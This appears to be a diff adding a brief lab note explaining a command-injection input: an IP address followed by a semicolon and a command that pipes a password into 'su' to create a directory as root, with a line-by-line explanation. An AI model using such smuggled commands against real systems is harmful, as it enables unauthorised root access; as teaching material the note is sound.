@@ -1,0 +1,11 @@
+We'll use the command 
+	192.168.1.160; echo 'projectpassword' | su - -c "mkdir /root/hacking"
+
+Where 
+	echo 'projectpassword' | su - " 
+
+Uses the output of "echo 'projectpassword'" as the input to 'su -' 
+And 
+	-c "mkdir /root/hacking"
+
+Is the command being run as root
